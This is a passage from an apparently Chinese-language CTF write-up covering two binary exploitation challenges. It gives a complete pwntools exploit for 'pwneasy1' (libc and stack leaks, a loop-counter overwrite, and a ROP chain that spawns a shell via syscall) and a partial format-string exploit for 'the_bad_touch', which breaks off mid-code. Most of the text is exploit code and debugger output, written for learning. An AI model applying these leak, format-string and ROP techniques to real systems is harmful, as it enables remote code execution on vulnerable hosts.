<span class="number">1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffc64422dc0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffc64422dc8</span> —▸ <span class="number">0x7ffc64422df0</span> —▸ <span class="number">0x7ffc64422e00</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffc64422dd0</span> —▸ <span class="number">0x7ffc64422f18</span> —▸ <span class="number">0x7ffc644240ee</span> ◂— <span class="string">&#x27;./pwneasy1&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffc64422dd8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffc64422de0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffc64422de8</span> ◂— <span class="number">0x904db1c7</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在 buf_addr 处有 libc 中遗留的地址，合理的覆盖低位就可以泄露 libc</li>
<li>有 libc 任意写的机会</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序只提供了3次任意写的机会，但是我们可以通过覆盖 i 来将这个机会提升至无限次</p>
<p>覆盖 libc 末地址就可以泄露 libc_base：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn(p8(<span class="number">0x80</span>),<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x21a680</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>用同样的方法泄露遗留在栈上的栈地址，基于栈地址就可以覆盖 i 了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwn(<span class="string">&quot;0&quot;</span>*<span class="number">0x18</span>,<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK 000000000000000000000000&quot;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">valuei_addr = stack_addr - <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;stack_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&quot;valuei_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(valuei_addr))</span><br><span class="line"></span><br><span class="line">pwn(<span class="built_in">str</span>(valuei_addr)+<span class="string">&quot;\n&quot;</span>,<span class="number">0xffffffff00000000</span>)</span><br></pre></td></tr></table></figure>
<p>最后打栈溢出就可以了，不过直接调用 <code>system</code> 会触发段错误，于是我们选择执行 <code>syscall</code></p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> inspect <span class="keyword">import</span> stack</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Value</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwneasy1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1283)\nb *$rebase(0x12B8)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">    sa(<span class="string">&quot;give me address: &quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    sa(<span class="string">&quot;give me value: &quot;</span>,<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line">pwn(p8(<span class="number">0x80</span>),<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x21a680</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;0&quot;</span>*<span class="number">0x18</span>,<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK 000000000000000000000000&quot;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">valuei_addr = stack_addr - <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;stack_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&quot;valuei_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(valuei_addr))</span><br><span class="line"></span><br><span class="line">pwn(<span class="built_in">str</span>(valuei_addr)+<span class="string">&quot;\n&quot;</span>,<span class="number">0xffffffff00000000</span>)</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="number">0x1d8698</span></span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">pwn(<span class="built_in">str</span>(valuei_addr)+<span class="string">&quot;\n&quot;</span>,<span class="number">0xffffffff00000000</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(pop_rdi_ret)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">2</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(binsh_addr)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn(<span class="built_in">str</span>(valuei_addr)+<span class="string">&quot;\n&quot;</span>,<span class="number">0xffffffff00000000</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">3</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(pop_rdx_r12_ret)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">4</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">5</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn(<span class="built_in">str</span>(valuei_addr)+<span class="string">&quot;\n&quot;</span>,<span class="number">0xffffffff00000000</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">6</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(pop_rsi_ret)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">7</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">8</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(syscall)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">pwn(<span class="built_in">str</span>(valuei_addr)+<span class="string">&quot;\n&quot;</span>,<span class="number">0x300000000</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="the-bad-touch"><a href="#the-bad-touch" class="headerlink" title="the_bad_touch"></a>the_bad_touch</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bad: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">37f</span>e215b6944a1cb29f0a404c1071f7cf67baaaf, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，PIE，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>两次格式化字符串漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">program</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  doit();</span><br><span class="line">  doit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *chunk; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  chunk = <span class="built_in">malloc</span>(<span class="number">0x3E8</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;try it: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, chunk, <span class="number">0x3E8</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)chunk);</span><br><span class="line">  <span class="built_in">free</span>(chunk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>有格式化字符串漏洞但是缓冲区在堆中，通过当前寄存器和栈可以泄露 heap_base，libc_base，libc_base，stack_addr：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*RCX  <span class="number">0x7faea9be9992</span> (read+<span class="number">18</span>) ◂— cmp    rax, <span class="number">-0x1000</span> <span class="comment">/* &#x27;H=&#x27; */</span></span><br><span class="line">*RDX  <span class="number">0x3e8</span></span><br><span class="line">*RDI  <span class="number">0x555eeb6c32a0</span> ◂— <span class="string">&#x27;%3$p\n%1$p\n\n&#x27;</span></span><br><span class="line">*RSI  <span class="number">0x555eeb6c32a0</span> ◂— <span class="string">&#x27;%3$p\n%1$p\n\n&#x27;</span></span><br><span class="line">*R8   <span class="number">0x8</span></span><br><span class="line">*R9   <span class="number">0x555eeb6c32a0</span> ◂— <span class="string">&#x27;%3$p\n%1$p\n\n&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%3$p\n%1$p\n%9$p\n&quot;</span></span><br><span class="line">sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">libc_base = leak_addr - <span class="number">0x114992</span></span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2a0</span></span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">pro_base  = leak_addr - <span class="number">0x1248</span></span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">io_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xebcf1</span></span><br><span class="line">success(<span class="string">&quot;io_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br></pre></td></tr></table></figure>
<p>接着就需要用到非栈上 fmt 的技巧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fff32e28280</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fff32e28280</span> —▸ <span class="number">0x7fff32e283c8</span> —▸ <span class="number">0x7fff32e290d6</span> ◂— <span class="number">0x4c00316461622f2e</span> <span class="comment">/* &#x27;./bad1&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fff32e28288</span> —▸ <span class="number">0x55b00dcf82a0</span> ◂— <span class="string">&#x27;%10c$13hn\n&#x27;</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rbp <span class="number">0x7fff32e28290</span> —▸ <span class="number">0x7fff32e282a0</span> —▸ <span class="number">0x7fff32e282b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fff32e28298</span> —▸ <span class="number">0x55b00ce2e252</span> ◂— nop    </span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fff32e282a0</span> —▸ <span class="number">0x7fff32e282b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fff32e282a8</span> —▸ <span class="number">0x55b00ce2e26d</span> ◂— mov    eax, <span class="number">0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fff32e282b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fff32e282b8</span> —▸ <span class="number">0x7fb072b0bd90</span> (__libc_start_call_main+<span class="number">128</span>) ◂— mov    edi, eax</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7fff32e282c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x7fff32e282c8</span> —▸ <span class="number">0x55b00ce2e255</span> ◂— push   rbp</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x7fff32e282d0</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x7fff32e282d8</span> —▸ <span class="number">0x7fff32e283c8</span> —▸ <span class="number">0x7fff32e290d6</span> ◂— <span class="number">0x4c00316461622f2e</span> <span class="comment">/* &#x27;./bad1&#x27; */</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x7fff32e282e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7fff32e282e8</span> ◂— <span class="number">0x1149dda85894f8f3</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x7fff32e282f0</span> —▸ <span class="number">0x7fff32e283c8</span> —▸ <span class="number">0x7fff32e290d6</span> ◂— <span class="number">0x4c00316461622f2e</span> <span class="comment">/* &#x27;./bad1&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x7fff32e282f8</span> —▸ <span class="number">0x55b00ce2e255</span> ◂— push   rbp</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x7fff32e28300</span> —▸ <span class="number">0x55b00ce30dd8</span> —▸ <span class="number">0x55b00ce2e130</span> ◂— endbr64 </span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x7fff32e28308</span> —▸ <span class="number">0x7fb072d46040</span> (_rtld_global) —▸ <span class="number">0x7fb072d472e0</span> —▸ <span class="number">0x55b00ce2d000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x7fff32e28310</span> ◂— <span class="number">0xeeb7b86d5d16f8f3</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x7fff32e28318</span> ◂— <span class="number">0xee2938c9221ef8f3</span></span><br></pre></td></tr></table></figure>
<p>对于非栈上 fmt 有两个关键点：</p>
<ul>
<li>修改栈指针，使两个栈指针最终指向同一片空间（需要修改的目标）</li>
<li>覆盖返回地址写循环</li>
</ul>
<p>位于 <code>0x7fff32e28290</code> 和 <code>0x7fff32e282a0</code> 这两处地址的空间正好符合条件，在实际利用的过程中遇到了一下问题：</p>
<ul>
<li>被 <code>%n</code> 修改过的栈空间并不能第一时间生效（第二个 <code>%n</code> 不会识别修改后的数据，而是会识别修改前的）</li>
<li>printf 不会调用 buffered_vfprintf 而是直接 jmp 过去（这意味着不能通过覆盖 <code>__vfprintf_internal</code> 的返回地址来实现循环）</li>
</ul>
<p>最后想出的解决办法是：第一次 fmt 使用 1/4096 的概率修改栈指针为函数 <code>doit</code> 的返回地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">magic = <span class="number">0xdbe8</span>-<span class="number">0x38</span></span><br><span class="line">payload = <span class="string">&quot;%3$p\n%1$p\n%9$p\n%6$p\n&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic)</span><br><span class="line">sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br></pre></td></tr></table></figure>
<p>在后续操作中交替覆盖函数 <code>doit</code> 的返回地址和函数 <code>main</code> 的返回地址，构造出 ROP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">target</span>):</span></span><br><span class="line">  <span class="keyword">global</span> magic_stack2</span><br><span class="line">  <span class="keyword">if</span>(target &lt; <span class="number">0x10000</span>):</span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%8$hn\n%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stack1,magic_gadget-<span class="number">1</span>-magic_stack1).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line">    magic_stack2 = magic_stack2 + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    magic_gadget = (target &gt;&gt; <span class="number">16</span>*i)%<span class="number">0x10000</span></span><br><span class="line">    </span><br><span class="line">    success(<span class="string">&quot;magic_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(magic_gadget))</span><br><span class="line">    <span class="keyword">if</span>(magic_stack1 &gt; magic_gadget):</span><br><span class="line">      payload = <span class="string">&quot;%&#123;&#125;c%10$hn\n%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic_gadget,magic_stack1-<span class="number">1</span>-magic_gadget).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">      sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      payload = <span class="string">&quot;%&#123;&#125;c%8$hn\n%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stack1,magic_gadget-<span class="number">1</span>-magic_stack1).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">      sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">    y = i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">2</span>):</span><br><span class="line">      magic_stack2 = magic_stack2 + <span class="number">8</span></span><br><span class="line">      y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(magic_stack2 &gt; magic_main):</span><br><span class="line">      payload = <span class="string">&quot;%&#123;&#125;c%10$hn\n%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic_main,magic_stack2-<span class="number">1</span>+<span class="number">2</span>*y-magic_main).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">      sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      